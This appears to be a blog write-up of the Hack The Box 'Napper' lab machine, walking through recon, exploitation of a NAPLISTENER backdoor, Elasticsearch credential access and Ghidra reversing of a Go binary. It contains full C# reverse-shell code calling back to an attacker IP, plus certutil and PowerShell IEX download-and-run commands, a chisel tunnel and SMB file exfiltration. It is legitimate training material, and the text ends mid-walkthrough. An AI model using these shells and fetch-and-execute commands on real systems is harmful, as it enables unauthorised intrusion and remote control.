---
layout: post
title:  "Napper Writeup - Hack The Box"
date:   2024-06-02
desc: ""
keywords: "HTB,OSED,Windows,NAPLISTENERBackdoor,Elasticsearch,Ghidra,GoDecrypt,RunasCsBypass,Hard"
categories: [HTB]
tags: [HTB,OSED,Windows,NAPLISTENERBackdoor,Elasticsearch,Ghidra,GoDecrypt,RunasCsBypass,Hard]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/napper_writeup/Napper.jpg" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

The high performance platform of **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**, has great laboratories, the **Napper** box is my second **Hard** machine of which I do a Writeup and the truth is that I learned a lot and also with the help of the **[Hack4u](https://hack4u.io/){:target="_blank"}** community I am adding new concepts, because between all of us we are sharing different ways to solve the same problem or challenge. I will access my account and start the machine.

<br /><br />
<img src="{{ site.img_path }}/napper_writeup/Napper_000.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `ping` I can verify that my connectivity with the machine is correct and with `nmap` I can start the **Reconnaissance** phase to know which ports, services and versions it has exposed. Something that quickly catches my attention is the domain name, so I add it to my `hosts` configuration file and I can, if **Virtual Hosting** is being implemented, access other web services through a subdomain. With `whatweb` from console I can inspect the technologies implemented in the Web Service, but with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** many times I find more, in this case it only leaks me that it is an **IIS** and the **Hugo** generator.

```bash
ping -c 1 10.10.11.240
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.240 -oG allPorts
nmap -sCV -p80,443 10.10.11.240 -oN targeted
#    --> app.napper.htb          [Add domain & subdomain]

nvim /etc/hosts
ping -c 1 napper.htb
ping -c 1 app.napper.htb
whatweb http://10.10.11.240
```

> **[Hugo](https://gohugo.io/){:target="_blank"}** is one of the most popular open-source static site generators. With its amazing speed and flexibility, Hugo makes building websites fun again. A fast and flexible static site generator built with love by **bep**, **spf13**, and friends in **Go**.

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_001.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_002.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_003.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_004.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I navigate in the webpage to see its content, its content is very related to **Malware** and **Reverse Engineering** (maybe a <ins>**clue**</ins> of what I will have to exploit?), there are some resources that are not available, and if I access to the source code I see nothing hardcoded except the names of the available resources. With an `nmap` script I search for hidden directories or files but it doesn't find anything, if I rely on `wfuzz` neither. If I analyze with `openssl` the certificate in the web service on port **443** to know if it is leaking information, such as subdomains, but it only shows me the one I had already found previously. But with `wfuzz` I can use custom dictionaries from **[SecList](https://github.com/danielmiessler/SecLists){:target="_blank"}** (fabulous project by **[Daniel Miessler](https://danielmiessler.com/){:target="_blank"}**, **[Jason Haddix](https://twitter.com/Jhaddix){:target="_blank"}**, and **[g0tmi1k](https://blog.g0tmi1k.com/){:target="_blank"}**) and now if I find a subdomain I immediately add it to my list of hosts, with `ping` again I check the connectivity to the web resource.

```bash
nmap --script http-enum -p443 10.10.11.240 -oN webScan                # :(
nmap --script http-enum -p443 10.10.11.240 -oN webScan -Pn            # :(
nmap --script http-enum -p443 10.10.11.240 -oN webScan -sSV           # :(
sudo nmap --script http-enum -p443 10.10.11.240 -oN webScan -sSV      


wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://app.napper.htb/FUZZ
wfuzz -c --hc=404 -L -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://app.napper.htb/FUZZ
# :(
wfuzz -c --hc=404 -L -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt https://10.10.11.240/FUZZ
# :(

openssl s_client --connect 10.10.11.240:443
wfuzz -c --hc=404 -L -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.napper.htb' https://10.10.11.240
wfuzz -c --hc=404 --hh=5589 -L -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.napper.htb' https://10.10.11.240
#      --> internal

nvim /etc/hosts
ping -c 1 internal.napper.htb
#     :)
```

<br/>
<img src="{{ site.img_path }}/napper_writeup/Napper_005.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_006.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_007.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_008.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_009.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_010.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_011.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_012.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I now access from my browser to the new subdomain I found with `wfuzz`, I am confronted with an authentication panel, and after trying default credentials and some techniques like **SQLi**, I have no success so far. But after reading for a while the posts that are published on the website, I find a username and password that works for me and I can access a post that has information about the **NAPLISTENER** and **[Sleeperbot](https://www.boxphish.com/sleeper-malware-the-trojan-horse-of-cybercrime/){:target="_blank"}** malware. The post gives all the information about exploiting a backdoor: a path, a parameter and the language used (**C#**), as well as resources for more information.

> **NAPLISTENER** (**Malware**) creates an <ins>**HTTP** request listener</ins> that can process incoming requests from the internet, reads any data that was submitted, <ins>decodes it from **Base64** format</ins>, and <ins>executes it in memory</ins>. **NAPLISTENER** is designed to evade network-based detection methods by behaving similarly to web servers.

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_013.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_014.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_015.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_016.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_017.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_018.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I do some tests from console, sending a specially designed `curl` request (created with all the information I got from the **NAPLISTENER** malware post) but I don't have a successful response. I am going to use **[BurpSuite](https://portswigger.net/burp){:target="_blank"}**, so I can see more clearly the answers and modify the request to find the correct one. After changing the type of method to use - **POST** -, and testing with subdomains, I get a **200** response code when I use the domain. Now I have to investigate how to create an <ins>executable</ins> or malicious <ins>library</ins> that executes in memory and obtain a **Reverse Shell**.

```bash
curl -s -X GET https://app.napper.htb/ews/MsExgHealthCheckd/ -I -k          # :(
curl -s -X POST https://app.napper.htb/ews/MsExgHealthCheckd/ -I -k         # :(
curl -s -X GET "https://napper.htb/ews/MsExgHealthCheckd/" -H "Authorization: Basic ZXhhbXBsZTpFeGFtcGxlUGFzc3dvcmQ=" --data "sdafwe3rwe23=test" -v -k        # ??

echo 'ping -n 1 10.10.14.152' | base64 -w 0; echo
echo 'ping -n 1  10.10.14.152' | base64 -w 0; echo
#      --> clear special character!
tcpdump -i tun0 icmp -n
curl -s -X POST https://app.napper.htb/ews/MsExgHealthCheckd/ -k --data 'sdafwe3rwe23=cGluZyAtbiAxICAxMC4xMC4xNC4xNTIK'
#      :(

# Use C# programming language!
burpsuite &>/dev/null & disown
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_019.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_020.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_021.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_022.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_023.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_024.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I search the **Internet** for some [example script written in **C#** to get a **Reverse Shell**](https://www.puckiestyle.nl/c-simple-reverse-shell/){:target="_blank"}, I find many resources. With the example code I can only modify the **IP** and **port** of my attacker machine in the injected command, install **[`mono-complete`](https://community.linuxmint.com/software/view/mono-complete){:target="_blank"}** on my machine to **[compile the source code](https://www.geeksforgeeks.org/how-to-compile-decompile-and-run-c-code-in-linux/){:target="_blank"}** and using `base64` encode it, open a port with `nc` to listen for a connection from the victim machine, finally with the **BurpSuite Repeater** tool I send the malicious request but I can't get anything, it's time to read a little more and consult about what problem I'm dragging.

```bash
nvim ConnectBack.cs
```

> **ConnectBack.cs**

```c
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("10.10.14.16", 443))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

```bash
apt install gnupg ca-certificates           # Installed!!
apt update
apt install mono-complete

chmod +x ConnectBack.cs
mcs -o:ConnectBack.exe ConnectBack.cs
# 1 Warning!

file ConnectBack.exe
# :)

base64 -w 0 ConnectBack.exe; echo
rlwrap nc -nlvp 443

#   --> Burpsuite (URL Encode special characters!) --> Send                            :( ???
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_025.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_026.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_027.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_028.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I look at the article shared in the post on the **internal.napper.htb** website, **[“NAPLISTENER: more bad dreams from developers of SIESTAGRAPH”](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph){:target="_blank"}**, I can understand what the problem is. The first thing is that the **Malware** invokes a **“.Run”** class, which does not match the one in my script, and I am going to change the **Namespace** name to match the script name. There is another **C#** [script on Github to get a Reverse Shell](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc){:target="_blank"}, but I am going to use **[Reverse Shell Generator](https://www.revshells.com/){:target="_blank"}** to create a custom script and after modifying it, I compile it with `mcs` and encode it again in **Base64**. I open a port with `nc` and send the request with **BurpSuite**, now I succeed and I could already access the machine, unfortunately I forgot to use some `rlwrap` (**-c**, **-A**, **-r**) parameters to have a better user experience in the console. Now I can know under which user I am getting the session, as well as the **IP** of the machine (I am on the victim machine) and access the first flag to corroborate on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform the first step, which is to compromise the box, now it's time to escalate privileges.

```bash
nvim reverse
```

> **Reverse.cs**

```c
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace Reverse
{
 public class Run
 {
  static StreamWriter streamWriter;

  public Run()
  {
   using(TcpClient client = new TcpClient("10.10.14.16", 443))
   {
    using(Stream stream = client.GetStream())
    {
     using(StreamReader rdr = new StreamReader(stream))
     {
      streamWriter = new StreamWriter(stream);

      StringBuilder strInput = new StringBuilder();

      Process p = new Process();
      p.StartInfo.FileName = "cmd";
      p.StartInfo.CreateNoWindow = true;
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.StartInfo.RedirectStandardInput = true;
      p.StartInfo.RedirectStandardError = true;
      p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
      p.Start();
      p.BeginOutputReadLine();

      while(true)
      {
       strInput.Append(rdr.ReadLine());
       //strInput.Append("\n");
       p.StandardInput.WriteLine(strInput);
       strInput.Remove(0, strInput.Length);
      }
     }
    }
   }
  }

  public static void Main(string[] args)
  {
   new Run();
  }

  private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
 }
}
```

```bash
chmod +x Reverse.cs
mcs -o:Reverse.exe Reverse.cs
base64 -w 0 Reverse.exe; echo
rlwrap nc -nlvp 443                       # <-- Not very efficient in navigation!       I'm forget -cAr :(

# Burpsuite !!
# URL-Encode key characters!!     :):)

whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_029.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_030.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_031.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_032.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_033.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_034.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_035.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_036.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Prior to continue with the next phase of **Recognition**, I am going to migrate to **[ConPtyShell](https://github.com/antonioCoco/ConPtyShell){:target="_blank"}** to have a better mobility. After modifying the **ConPtyShell** script, so that after downloading and interpreting it, it automatically sends me the **Reverse Shell** and after having some problems when transferring the script, I achieve to have a **Full Iteractive Shell**. I perform some recon commands to gather information to find some vulnerability or misconfiguration, I find a **SeDelegateSessionUserImpersonatePrivilege** privilege that seems intriguing but does not give me a possible attack vector for the moment.

> **[SeDelegateSessionUserImpersonatePrivilege](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/user-rights-assignment){:target="_blank"}**: Impersonate a client after authentication.

> **Attacker Machine:**

```bash
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1

nvim Invoke-ConPtyShell.ps1
cat !$ | tail -n 2
# Invoke-ConPtyShell -RemoteIp 10.10.14.16 -RemotePort 443 -Rows 29 -Cols 128

impacket-smbserver smbFolder $(pwd) -smb2support
# or:
# python3 -m http.server 80

nc -nlvp 443
```

> **Victime Machine:**

```cmd
certutil -urlcache -f -split http://10.10.14.16/Invoke-ConPtyShell.ps1        # :(
Import-Module .\Invoke-ConPtyShell.ps1
Invoke-ConPtyShell -RemoteIp 10.10.14.16 -RemotePort 443 -Rows 29 -Cols 128   # :(

certutil -urlcache -f -split http://10.10.14.16/Invoke-ConPtyShell.ps1        # :)
# or:
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-ConPtyShell.ps1')

# [Ctrl^z]
stty raw -echo; fg          # [ENTER][ENTER]

whoami /priv
whoami /all
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON"      # :(
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_037.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_038.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_039.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_040.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_041.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_042.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_043.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/napper_writeup/Napper_044.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue enumerating the victim machine with some simple commands, and I find with `netstat` that there are some open ports but they are only accessible locally, one of them is **9200** which by default is the one used by **Elasticsearch**. To access from my browser I am going to create a tunnel with **[Chisel](https://github.com/jpillora/chisel){:target="_blank"}**, for that I first need to know the architecture of the **Windows OS** and download the correct binary. Once `chisel.exe` is transferred to the **Napper** box I can configure it in client mode to connect to my server and with the browser I can have access to the **Elasticsearch** service. Unfortunately the default credentials do not work so I will have to keep looking for more information.

> **[Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/elasticsearch-intro.html){:target="_blank"}**: is the distributed search and analytics engine at the heart of the **Elastic Stack**. **Logstash** and **Beats** facilitate collecting, aggregating, and enriching your data and storing it in **Elasticsearch**. **Kibana** enables you to interactively explore, visualize, and share insights into your data and manage and monitor the stack. **Elasticsearch** is where the indexing, search, and analysis magic happens.

> **go-elasticsearch**: The official Go client for Elasticsearch.

> **Victime Machine:**

```cmd
netstat -ano
#    --> 9200  9300      ??
                                                                                                                          
curl http://127.0.0.1:9200        # :(

systeminfo

#    --> chisel_1.9.1_linux_amd64.gz
#    --> chisel_1.9.1_windows_arm64.gz
```

> **Attacker Machine:**

```bash
mv /home/al3j0/Downloads/chisel_1.9.1_* .
gunzip chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x !$
mv chisel_1.9.1_windows_amd64 chisel.exe
python3 -m http.server 80
```

> **Victime Machine::**

```cmd
cd C:\Windows\Temp
powershell
mkdir privesc
cd privesc
certutil -urlcache -f -split http://10.10.14.152/chisel.exe
copy \\10.10.14.16\smbFolder\chisel.exe .\                                    # :)
```

> **Attacker Machine:**

```bash
./chisel server --reverse -p 1234                         
```

> **Victime Machine:**

```cmd
.\chisel.exe client 10.10.14.152:1234 R:9200:127.0.0.1:9200
```

> **Attacker Machine:**

```bash
lsof -i:9200        :)

# google.es --> elasticsearch default password                
# elastic:changeme        :(
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_045.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_046.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_047.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_048.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_049.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_050.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After a long time, walking around without sense, I find in the **Temp** folder in the main **Windows** directory, with the resources of the web services of the machine. In a folder I find files written in **[Markdown](https://www.markdownguide.org/getting-started/){:target="_blank"}** language that clearly correspond to the posts of the page with subdomain **app** and in another folder with those of the **internal** web page, but in this last one I find a post that was hidden, that mentions that the password of the `backup` user is stored in the **Elasticsearch** Database. The above mentioned user belongs to the **Administrators** group, which tells me that I perform a **User Pivoting** to him I am going to **pwn** the box. Also in the contents of a folder with an `.env` file that stores credentials and a very strange binary **`a.exe`** (that I am going to transfer to my machine to perform a debugging), the user and password are useful to log in to **Elasticsearch**.

> **Victime Machine:**

```cmd
cd C:\Temp\www\internal\content\posts\
type no-more-laps.md
#    --> The password for the backup user will be stored in the local Elastic DB.

net users
net user backup
#    --> Local Group Memberships      *Administrators      :)

cd C:\Temp\www\internal\content\posts\internal-laps-alpha
more .env
#      --> a.exe     ??
.\a.exe
certutil -hashfile a.exe MD5
```

> **Attacker Machine:**

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username oldboy -password oldboy123
```

> **Victime Machine:**

```cmd
net use x: \\10.10.14.152\smbFolder /user:oldboy oldboy123
cp .\a.exe x:\
md5sum a.exe
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_051.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_052.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_053.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/napper_writeup/Napper_054.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_055.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_056.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_057.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_058.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_059.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I always know that I have the excellent resource of **HackTricks**, which provides me with all the information I need to list or exploit some service in which I do not have the necessary expertise. In this case I use the content of **[9200 - Pentesting Elasticsearch](https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch){:target="_blank"}** and I am finding very interesting information: there are **two indexes**, in one of which there is a document whose key value is the **seed** (which will be used to generate the encrypted password of the `backup` user) that appears to be dynamic, in the other index I find documents with keys and values seem to be the user data and password (dynamic, due to the seed). The value is **Base64** encoded, but if I decode it with `base64` its output is unreadable, which confirms that it is encrypted. I can access all the content at once if I access the `_search` endpoint and also confirm that the encrypted seed and password values are dynamic.

> An Elasticsearch **index** is a collection of related documents stored as **JSON**. Each document consists of keys and their corresponding values (strings, numbers, booleans, dates, arrays, geolocations, etc.).

> **Elasticsearch** uses an efficient data structure called an inverted index to facilitate fast full-text searches. This index lists every unique word in the documents and identifies the documents in which each word appears.

```bash
curl -s -k -X GET 'https://user:DumpPassword$Here@127.0.0.1:9200/_cat/indices?v'
#    --> seed, user-00001
curl -s -k -X GET 'https://user:DumpPassword$Here@127.0.0.1:9200/seed/_search?pretty=true'
curl -s -k -X GET 'https://user:DumpPassword$Here@127.0.0.1:9200/seed/_search?pretty=true' | grep seed
#    --> Seed static?
curl -s -k -X GET 'https://user:DumpPassword$Here@127.0.0.1:9200/seed/_search?pretty=true' | grep seed
#    --> Seed dynamic!

curl -s -k -X GET 'https://user:DumpPassword$Here@127.0.0.1:9200/user-00001/_search?pretty=true'
echo dczRzo8BAQ7RBElmzKAp | base64 -d; echo
echo puMhtHJptAV5ujPQWrBkYqyDVAUh9JGCvJ43T9CMrGWLZa7T9I-FoxDvpNZrlnSWNCo4Db8RMVk= | base64 -d; echo

curl -s -k -X GET 'https://user:DumpPassword$Here@127.0.0.1:9200/user-00001/_search?pretty=true' | grep blob
#    --> Dynamic value!

curl -s -k -X GET 'https://user:DumpPassword$Here@127.0.0.1:9200/_security/role' | jq
curl -s -k -X GET 'https://user:DumpPassword$Here@127.0.0.1:9200/_security/user' | jq
curl -s -k -X GET 'https://user:DumpPassword$Here@127.0.0.1:9200/_security/user/backup' | jq
#    --> ...is unauthorized for user...
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_060.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_061.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_062.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_063.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/napper_writeup/Napper_064.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_065.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_066.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_067.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_068.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I am going to focus all my attention on the binary I found in the folder of the web service **internal.mapper.htb** (**a.exe**), I am very convinced that it is related or maybe in charge of generating the password. I am going to do the debugging with **[Ghidra](https://www.ghidra-sre.org/){:target="_blank"}**, an excellent tool for this kind of binaries. I just need to create a non-shared project, import the binary, check that everything is correctly configured (**be careful**, the programming language of the binary is **Go**), feed the dragon with the binary to analyze it and look for the **`main`** function to start the reverse engineering task.

```bash
file a.exe
./ghidraRun 
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_069.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_070.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_071.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_072.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_073.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/napper_writeup/Napper_074.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_075.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_076.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

**Reverse Engineering** begins, which has a lot of deduction and guesswork at the beginning and then transforms into some kind of certainty if I did it correctly. **Ghidra** is a very versatile tool that allows you to change variable names to a more descriptive one or add comments in some part of the code, these actions allow me to better locate myself as I advance in the analysis of the code. At the beginning I deduce from some lines of code in which a file with environment variables is loaded, another one I think is in charge of ignoring the **SSL** certificate. But the most interesting is that it is generating a random value and then generating the key value with the **`genKey`** function, in which I can first deduce that it is using the **`math/rand`** package of **Go** and that it is using **[AES128](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard){:target="_blank"}** as encryption method. There is also a drawback when generating the key, it depends on the randomness of the **seed**, if it does not change it always remains with the same value, you can check it with a small script (I must first [install go on my machine](https://go.dev/doc/install){:target="_blank"}).

```bash
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.22.3.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

nvim main.go
go run main.go
```
